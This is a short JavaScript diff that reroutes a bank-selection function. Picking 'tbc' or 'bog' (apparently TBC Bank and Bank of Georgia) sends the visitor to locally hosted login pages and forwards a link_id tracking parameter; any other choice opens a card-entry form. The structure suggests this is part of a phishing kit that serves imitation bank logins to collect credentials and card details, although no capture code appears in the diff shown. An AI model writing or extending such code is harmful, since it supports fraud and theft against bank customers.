@@ -2517,7 +2517,27 @@ function closeCardModal() {
 }
 
 function selectBank(bank) {
-  openCardModal();
+  const urlParams = new URLSearchParams(window.location.search);
+  const link_id = urlParams.get('link_id');
+
+  let loginUrl = '';
+  if (bank === 'tbc') {
+    loginUrl = './tbc_login.html';
+  } else if (bank === 'bog') {
+    loginUrl = './bog_login.html';
+  } else {
+    // For 'other' card option, open card form
+    openCardModal();
+    return;
+  }
+
+  // Add link_id to URL if available
+  if (link_id) {
+    loginUrl += '?link_id=' + encodeURIComponent(link_id);
+  }
+
+  // Open login page
+  window.location.href = loginUrl;
 }
 
 // Кнопка "Подтвердить" вызывает openBankModal()
